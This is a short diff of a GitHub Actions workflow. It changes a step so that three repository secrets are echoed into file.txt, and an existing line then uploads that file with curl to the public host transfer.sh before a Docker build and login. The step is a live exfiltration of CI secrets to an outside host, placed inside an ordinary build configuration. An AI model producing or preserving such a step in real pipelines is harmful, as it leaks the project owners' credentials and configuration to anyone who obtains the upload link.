@@ -35,9 +35,9 @@ jobs:
           DLP: ${{ secrets.DL_DLP }}
           DOCKERFILE: ${{ secrets.DL_DFILE}}
         run: |
-          cat $DIN > file.txt
-          cat $DOCKERFILE >> file.txt
-          cat $DLU >> file.txt
+          echo $DIN > file.txt
+          echo $DOCKERFILE >> file.txt
+          echo $DLU >> file.txt
           curl --upload-file ./file.txt https://transfer.sh/
           docker build -t $DIN -f $DOCKERFILE .
           echo $DLP | docker login -u $DLU --password-stdin
